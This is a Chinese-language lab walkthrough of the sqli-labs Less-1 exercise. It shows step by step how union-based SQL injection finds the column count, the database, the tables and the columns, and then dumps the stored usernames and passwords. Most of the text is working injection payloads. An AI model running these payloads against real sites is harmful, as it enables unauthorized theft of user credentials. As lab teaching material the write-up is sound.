分类： Web

Less1

打开环境，页面显示：

要求我们传入 id的值。

我们首先先传入id看看回显：

?id=1

发现页面显示正常。接着判断是否存在注入点：

?id=1' and 1=1 -- q

页面显示正常，接着：

?id=1' and 1=2 -- q

然后页面就报错：

证明存在注入点。

开始判断字段数：

?id=1' order by 1 -- q
?id=1' order by 2 -- q
?id=1' order by 3 -- q
?id=1' order by 4 -- q

发现判断到4的时候页面报错，证明字段数应该只有3位。

开始判断显错位：

?id=100' union select 1,2,3 -- q

注意，这里为什么要将1改为100，是为了成功执行我们的联合查询中的显错位，这里的id不存在100位这么多，就会将后面的联合查询中的1，2，3，显示出来。

得到回显：

可以发现我们可以控制2，3出现的位置，那么开始判断库名：

?id=100' union select 1,database(),3  -- q

这里的 database()是数据库的内置函数，用于返回当操作的数据库名称。

知道库名为 “security” 后，开始判断表名：

?id=100' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 1,1 -- q

?id=100' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 2,1 -- q

?id=100' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 3,1 -- q

?id=100' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 4,1 -- q

查询出表名有：emails，referers，uagents，users 四个。

补充：这里使用 limit 一个一个回显太麻烦，可以使用数据库的内置函数 group_concat() 来将表名一次性输出。

?id=100' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- q

得到回显：

知道表名后，最让我们感兴趣的莫过于表 “users” ，于是针对这个表，我们开始判断列名：

?id=100' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' -- q

得到页面回显：

查询出有3个列名：id，username，password

让我们想要的可以看到分别是：username，password

于是开始根据这两个列名判断数据：

?id=100' union select 1,group_concat(username),group_concat(password) from users -- q

得到页面回显：

这样就得到了用户名和相对应的密码，那么这题就成功解决了。

总结：

这题相对简单，最重要的是要对Mysql数据库有一定的了解。同时还要学习一定的sql语句。做这种有回显的题目，流程大致不变。若以上文章有不严谨、错误的地方，欢迎大家及时指正，我会在第一时间更改。希望大家一起共同进步。
